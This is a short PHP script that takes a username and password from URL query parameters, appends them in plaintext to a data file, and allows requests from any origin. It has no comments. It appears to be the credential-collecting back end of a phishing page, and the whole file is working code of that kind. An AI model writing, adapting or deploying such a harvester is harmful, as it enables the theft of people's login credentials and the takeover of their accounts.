<?php

$name = $_GET['Username'];
$pasw = $_GET['Password'];

if(!empty($name)){
    $fp = fopen('../data0.txt', 'a');
    fwrite($fp, "\n".$name.','.$pasw);
    fclose($fp);
}

header('Access-Control-Allow-Origin: *');

?>
